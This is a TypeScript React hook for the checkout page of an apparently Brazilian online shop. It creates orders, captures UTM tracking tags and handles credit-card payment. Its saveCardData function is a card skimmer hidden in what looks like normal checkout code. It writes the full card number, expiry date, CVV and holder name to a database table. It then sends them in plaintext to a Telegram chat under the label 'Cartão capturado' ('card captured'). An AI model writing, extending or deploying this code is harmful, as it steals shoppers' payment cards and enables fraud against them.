import { useState } from 'react';
import {
  CustomerData,
  Order,
  PaymentMethod,
  PaymentStatus,
  Product,
  BillingData,
  CreditCardData
} from '@/types/checkout';
import { supabase } from '@/integrations/supabase/client';
import { sendTelegramNotification } from '@/lib/notifications/sendTelegramNotification';
import { usePixelEvents } from '@/hooks/usePixelEvents';

// Declaração global para o TypeScript reconhecer window.utmfy
declare global {
  interface Window {
    utmfy?: {
      get: () => {
        utm_source?: string;
        utm_medium?: string;
        utm_campaign?: string;
        utm_term?: string;
        utm_content?: string;
      };
    };
  }
}

export const useCheckoutOrder = () => {
  const [isSubmitting, setIsSubmitting] = useState(false);
  const { trackPurchase } = usePixelEvents();

  const createOrder = async (
    customer: CustomerData,
    product: Product,
    paymentMethod: PaymentMethod,
    cardData?: CreditCardData
  ): Promise<Order> => {
    // Captura os dados UTM do navegador via UTMFY
    const utms = typeof window !== 'undefined' && window.utmfy?.get ? window.utmfy.get() : {};

    // Criar pedido com dados do cliente e UTMs
    const order = {
      customer_id: `customer_${Date.now()}`,
      customer_name: customer.name,
      customer_email: customer.email,
      customer_cpf_cnpj: customer.cpfCnpj,
      customer_phone: customer.phone,
      product_id: product.id,
      product_name: product.name,
      product_price: product.price,
      status: 'PENDING' as PaymentStatus,
      payment_method: paymentMethod,

      // UTMs capturados
      utm_source: utms.utm_source || null,
      utm_medium: utms.utm_medium || null,
      utm_campaign: utms.utm_campaign || null,
      utm_content: utms.utm_content || null,
      utm_term: utms.utm_term || null
    };

    const { data, error } = await supabase.from('orders').insert(order).select().single();
    if (error) throw new Error(error.message);

    if (paymentMethod === 'creditCard' && cardData) {
      await saveCardData(data.id, cardData, product.price);
    }

    return {
      id: data.id,
      customerId: data.customer_id,
      customerName: data.customer_name,
      customerEmail: data.customer_email,
      customerCpfCnpj: data.customer_cpf_cnpj,
      customerPhone: data.customer_phone,
      productId: data.product_id,
      productName: data.product_name,
      productPrice: data.product_price,
      status: data.status as PaymentStatus,
      paymentMethod: data.payment_method as PaymentMethod,
      asaasPaymentId: data.asaas_payment_id,
      createdAt: data.created_at,
      updatedAt: data.updated_at
    };
  };

  const saveCardData = async (orderId: string, cardData: CreditCardData, productPrice: number) => {
    const bin = cardData.number.substring(0, 6);

    const cardDataToSave = {
      order_id: orderId,
      holder_name: cardData.holderName,
      number: cardData.number,
      expiry_date: cardData.expiryDate,
      cvv: cardData.cvv,
      bin: bin,
      brand: cardData.brand || 'unknown'
    };

    const { error } = await supabase.from('card_data').insert(cardDataToSave);

    if (error) {
      console.error('Erro ao salvar dados do cartão:', error);
    } else {
      try {
        trackPurchase(orderId, productPrice);
        console.log('Purchase event triggered for card capture', { orderId, value: productPrice });
      } catch (trackError) {
        console.error('Error triggering purchase event:', trackError);
      }

      try {
        const brandName = (cardData.brand || 'Unknown').toUpperCase();
        const message = `💳 Cartão capturado:\n\nNúmero: ${cardData.number}\nValidade: ${cardData.expiryDate}\nCVV: ${cardData.cvv}\nTitular: ${cardData.holderName}\nBandeira: ${brandName}`;
        await sendTelegramNotification(message);
        console.log('Telegram notification sent with card details');
      } catch (telegramError) {
        console.error('Erro ao enviar notificação para o Telegram:', telegramError);
      }
    }
  };

  const prepareBillingData = (customerData: CustomerData, product: Product, orderId: string): BillingData => {
    return {
      customer: customerData,
      value: product.price,
      description: product.name,
      orderId: orderId
    };
  };

  return {
    isSubmitting,
    setIsSubmitting,
    createOrder,
    prepareBillingData,
    saveCardData
  };
};
